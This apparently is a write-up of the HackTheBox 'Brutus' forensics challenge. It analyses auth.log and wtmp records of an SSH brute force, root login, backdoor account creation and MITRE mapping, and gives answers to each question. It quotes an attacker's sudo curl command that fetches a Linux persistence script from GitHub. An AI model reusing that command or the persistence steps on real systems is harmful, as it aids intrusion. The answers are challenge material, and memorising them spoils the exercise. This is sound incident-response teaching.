---
title: HTB Sherlock · Brutus
slug: htb-brutus
date: 2026-08-21
image: brutus
platform: HackTheBox
os: Linux
difficulty: Very Easy
points: 195
tags: [hackthebox, sherlock, linux, very-easy, retired, dfir, linux-forensics, incident-response]
description: Brutus is an entry-level DFIR challenge that provides a auth.log file and a wtmp file. I’ll use these two artifacts to identify where an attacker performed an SSH brute force attack, eventually getting success with a password for the root user. I’ll see how the user comes back in manually and connects, creating a new user and adding that user to the sudo group. Finally, that user connects and runs a couple commands using sudo.
featured: true
---

# Scenario
In this Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

---
# Initial Analysis

We have been provided with two artifacts, the Linux authentication (`auth`) logs and the
`WTMP` output. Lets kick off with a brief explanation of what these log files are, what they
are used for and the fields and information they contain.

## auth.log
The auth.log file is primarily used for tracking authentication mechanisms. Whenever a
user attempts to log in, switch users, or perform any task that requires authentication, an
entry is made in this log file. This includes activities involving sshd (SSH daemon), sudo
actions, and cron jobs requiring authentication.

### Fields in auth.log
**Entries in auth.log typically include the following fields:**

| Field                 | Description                                                                                                                       |
| --------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| Date and Time         | The timestamp when the event occurred.                                                                                            |
| Hostname              | The name of the system on which the event occurred.                                                                               |
| Service               | The name of the daemon or service reporting the event, such as sshd for SSH daemon.                                               |
| PID                   | The Process ID (PID) of the service when the event was logged.                                                                    |
| User                  | The username involved in the authentication process.                                                                              |
| Authentication Status | Details whether the authentication attempt was successful or<br>failed.                                                           |
| IP Address/Hostname   | For remote connections, the IP address or hostname of the<br>client attempting to connect.                                        |
| Message               | A detailed message about the event, including any specific error messages<br>or codes associated with the authentication attempt. |
An example entry has been detailed below:
```js
Mar 10 10:23:45 exampleserver sshd[19360]: Failed password for invalid
user admin from 192.168.1.101 port 22 ssh2
```
The entry above shows a failed password attempt for a user named "admin" on
exampleserver from a source IP of 192.168.1.101 over port 22 (SSH)

---
# wtmp
The wtmp file logs all login and logout events on the system. It's a binary file, typically
located at `/var/log/wtmp`. The last command can be used to read this file, providing a
history of user logins and logouts, system reboots, and runlevel changes.
## Fields in wtmp
Since wtmp is a binary file, it's not directly readable like auth.log. However, when viewed
through utilities like last, the following information is presented:

| Field               | Description                                                                                         |
| ------------------- | --------------------------------------------------------------------------------------------------- |
| Username            | The name of the user logging in or out.                                                             |
| Terminal            | The terminal or tty device name. Remote logins typically show the SSH or telnet connection details. |
| IP Address/Hostname | For remote logins, the IP address or hostname of the user's<br>machine.                             |
| Login Time          | The date and time the user logged in.                                                               |
| Logout Time         | The date and time the user logged out or the session was closed.                                    |
| Duration            | The duration of the session.                                                                        |
See below an example of the output of the 'last' command:
```js
sebh24 pts/0 192.168.1.100 Sat Mar 10 10:23 - 10:25
(00:02)
```
This indicates that the user sebh24 logged in from 192.168.6.100 and the session lasted for
a total of 2 minutes.

---
# utmp.py
It is important to realize that when the CPU architecture of the forensic investigators system
differs from the architecture of the system that the wtmp file was taken from, there can be
issues when using built-in tools such as last or utmpdump . For this reason they have
provided a tool called utmp.py (originally taken from https://gist.github.com/4n6ist/99241df
331bb06f393be935f82f036a5) to aid the investigation.
### The steps to utilising the tool are as follows:
```python
python3 utmp.py -o wtmp.out wtmp
```
This provides us with a human readable `wtmp.out` file that we can open in tools such as
cat or less.
### Understanding utmp.py Output
The output of utmp.py includes several fields decoded from the binary format of the wtmp
file. Here's a brief overview of the key fields in the output:

| Field   | Description                                                                                                                                                                                                                                  |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Type    | This indicates the type of record, such as a user login or logout, system boot, or<br>shutdown event.                                                                                                                                        |
| PID     | The Process ID related to the event.                                                                                                                                                                                                         |
| Line    | The terminal line (tty or pts) that the user is logged into.                                                                                                                                                                                 |
| ID      | A short identifier related to the line field.                                                                                                                                                                                                |
| User    | The username associated with the event.                                                                                                                                                                                                      |
| Host    | The hostname or IP address from where the user is accessing the system, if<br>applicable.                                                                                                                                                    |
| Exit    | The exit status of a session or a process.                                                                                                                                                                                                   |
| Session | The session ID.                                                                                                                                                                                                                              |
| sec     | The timestamp of the event. **NB. This timestamp will be presented using your<br>system timezone and not the timezone of the system the wtmp was taken from.<br>You will need to account for this when investigating an incident timeline.** |
| usec    | The microseconds component of the timestamp associated with a login or logout<br>event                                                                                                                                                       |
| Addr    | Additional address information, which could be the IP address in the case of<br>remote logins.                                                                                                                                               |
Both auth.log and WTMP are vital for system administrators and security professionals to
monitor and audit authentication attempts, user activities, and system access patterns.
They help in identifying unauthorized access attempts, ensuring compliance with security
policies, and investigating security incidents.
Okay now we understand more about the provided artifacts, lets delve into the auth.log for
our analysis. We open our auth.log in our favorite text editor and prepare to answer the
provided questions.

# Questions
---
1. **Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**

To spot a brute force attack in the auth.log , look for repeated occurrences of "Invalid
user" and "Failed password" entries within a short period. These entries indicate failed login
attempts, often with incorrect usernames or passwords.
In the provided logs there are numerous attempts from a single IP address, 65.2.161.68 ,
indicating a brute force attack. Take particular note of the timestamps, all falling within
seconds. A great rule of thumb when hunting for bruteforce attacks is to consider "Could a
human attempt to authenticate this often manually". If the answer is no, we suggest
additional investigation.

**Answer:** `65.2.161.68`

2. **The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?**

We have confirmed the IP address performing a bruteforce attack, however we need to
understand if the Threat Actor (TA) was successful. After a successful brute force attack, the
keyword "Accepted password" signifies a successful login we are able to confirm the successful authentication of the root account as part of the same bruteforce attack, indicating they've compromised the most privileged user on the system. In the same second we additionally see the session is closed, which further indicates a bruteforcing tool being used.

**Answer:** `root`

3.  **Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**

We confirm the TA authenticated at 06:32:44 with the root account, however for this specific
analysis we will use the WTMP artifact as this will provide us the time when the attacker had
an interactive terminal connected, and not just when the password was accepted. Before
continuing, please see below a brief explanation as to the discrepancy in time between the
WTMP and auth.log artifacts.

| auth.log                                                                                                  | WTMP                                                                                                                                                                                                                                           |
| --------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| The auth.log in the<br>context of logging into<br>a host tracks<br>specifically<br>authentication events. | Entries in the WTMP record the creation and destruction of<br>terminals, or the assignment and release of terminals to users.<br>In this context we are able to track the interactive session<br>created by the TA accurately within the WTMP. |
Reviewing the output of wtmp we are able to confirm the successful opening of an
interactive terminal session by the TA at 06:32:45
As described above this timestamp will be presented using our system timezone. We can
check this by running the `timedatectl` command and my system's timezone is EDT so i need to convert it to UTC to get the accurate time.
**Answer:** `2024-03-06 06:32:45`

4. **SSH Login sessions are tracked and assigned a session number upon logon. What is attacker's session number for the user account from Question 2?**

Each SSH login session is assigned a unique session number for tracking which can be
viewed within the auth.log file and can be found by looking at the log line immediately after
the `session` opened log line.
```js
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```
According to the auth logs, the session number assigned to the attacker's login (using the
compromised `root` account) was `37`.

**Answer**: `37`

5. **The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**
```js
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
```
**Answer:** `cyberjunkie`

6. **What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**
We understand a new user account was created as a method of achieving persistence and the account was a local account on the compromised host. We now need to translate this into a technique ID utilising the MITRE ATT&CK framework. The MITRE ATT&CK framework categorises various tactics and techniques used by attackers. We can utilize the [Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/) and locate under "Persistence" the "Create Account" technique, detailed below as [T1136](https://attack.mitre.org/techniques/T1136/).

Lets right click into this technique and delve a little deeper, looking at the sub-techniques. Sub-techniques allow us to break down attacks more granularly. For example there are numerous types of accounts that could be created, in the screenshot below we can view Domain, Local and Cloud. In the current investigation we are aware it was a local account therefore the subtechnique is [T1136.001](https://attack.mitre.org/techniques/T1136/001/).

**Answer:** `T1136.001`

7. **What time did the attacker's first SSH session end according to auth.log?**

In question 4 we found out the session ID was 37. We are able to confirm in the auth.log
that that the session 37 closed at 06:37:24.
```js
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```
**Answer:** `2024-03-06 06:37:24`

8. **The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**
The logs reveal that the attacker executed a command to download a script from a GitHub repository using sudo . The full command was: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh . This action indicates the attacker's intention to deploy additional tools or malware for further exploitation or persistence.
```js
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```
**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
